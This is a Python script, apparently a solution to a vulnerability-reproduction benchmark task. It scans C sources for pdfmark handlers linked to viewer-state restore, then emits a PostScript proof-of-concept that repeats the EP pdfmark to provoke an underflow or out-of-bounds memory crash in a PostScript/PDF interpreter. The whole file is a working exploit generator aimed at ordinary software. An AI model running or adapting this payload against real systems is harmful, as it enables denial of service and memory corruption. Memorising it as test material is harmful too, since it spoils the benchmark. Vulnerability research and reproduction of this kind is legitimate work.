import os
import re
import tarfile
from typing import List, Set


class Solution:
    def _scan_text_for_pdfmark_tokens(self, text: str) -> Set[str]:
        tokens: Set[str] = set()

        if "viewer" not in text:
            return tokens

        restore_kws = (
            "restore_viewer",
            "viewer_restore",
            "viewer_state_restore",
            "restore_viewer_state",
            "restore_viewer_state",
        )

        if not any(kw in text for kw in restore_kws):
            return tokens

        # Heuristic: find occurrences of restore-related symbols and infer nearby pdfmark_* handler name.
        for kw in restore_kws:
            start = 0
            while True:
                idx = text.find(kw, start)
                if idx < 0:
                    break
                back = text.rfind("pdfmark_", 0, idx)
                if back >= 0 and idx - back <= 20000:
                    j = back + len("pdfmark_")
                    k = j
                    n = len(text)
                    while k < n:
                        c = text[k]
                        if not (c.isalnum() or c == "_"):
                            break
                        k += 1
                    token = text[j:k]
                    if 1 <= len(token) <= 32 and re.fullmatch(r"[A-Za-z0-9_]+", token):
                        tokens.add(token)
                start = idx + len(kw)

        # Also look for explicit pdfmark handlers containing both "viewer" and "depth" and "restore"
        for m in re.finditer(r"\bpdfmark_([A-Za-z0-9_]{1,32})\s*\(", text):
            token = m.group(1)
            wstart = m.start()
            wend = min(len(text), wstart + 12000)
            win = text[wstart:wend]
            if "viewer" in win and "depth" in win and "restore" in win:
                tokens.add(token)

        return tokens

    def _scan_sources_for_tokens(self, src_path: str) -> List[str]:
        tokens: Set[str] = set()

        def process_text(raw: bytes) -> None:
            try:
                text = raw.decode("utf-8", "ignore")
            except Exception:
                text = raw.decode("latin-1", "ignore")
            tokens.update(self._scan_text_for_pdfmark_tokens(text))

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith(".c") or lfn.endswith(".h") or lfn.endswith(".cc") or lfn.endswith(".cpp")):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        with open(path, "rb") as f:
                            raw = f.read(4_000_000)
                    except Exception:
                        continue
                    process_text(raw)
        else:
            if tarfile.is_tarfile(src_path):
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        for m in tf.getmembers():
                            if not m.isreg():
                                continue
                            name = m.name.lower()
                            if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cc") or name.endswith(".cpp")):
                                continue
                            try:
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                raw = f.read(4_000_000)
                            except Exception:
                                continue
                            process_text(raw)
                except Exception:
                    pass

        # Prioritize common pdfmark page delimiters if discovered.
        prioritized = []
        for t in ("EP", "BP"):
            if t in tokens:
                prioritized.append(t)
        rest = sorted(t for t in tokens if t not in set(prioritized))
        # Always include EP as a likely trigger.
        if "EP" not in set(prioritized) and "EP" not in set(rest):
            prioritized = ["EP"] + prioritized
        return prioritized + rest

    def solve(self, src_path: str) -> bytes:
        tokens = self._scan_sources_for_tokens(src_path)

        # Construct a tiny PostScript PoC. Wrap pdfmark calls in `stopped` so fixed versions (or
        # environments without pdfmark) won't error out; memory bugs still crash.
        lines = [
            "%!PS-Adobe-3.0",
            "%%Pages: 1",
            "%%EndComments",
        ]

        # Try discovered tokens first (if any), then an aggressive BP/EP/EP... sequence.
        # Keep it small but include multiple restores to amplify underflow/OOB.
        for t in tokens[:8]:
            safe_t = re.sub(r"[^A-Za-z0-9_]", "", t)[:32]
            if not safe_t:
                continue
            lines.append(f"{{ mark /Page 1 /{safe_t} pdfmark }} stopped pop")

        lines.append("{ mark /Page 1 /BP pdfmark } stopped pop")
        for _ in range(24):
            lines.append("{ mark /Page 1 /EP pdfmark } stopped pop")

        lines.extend([
            "showpage",
            "quit",
            "%%EOF",
            "",
        ])

        return ("\n".join(lines)).encode("ascii", "ignore")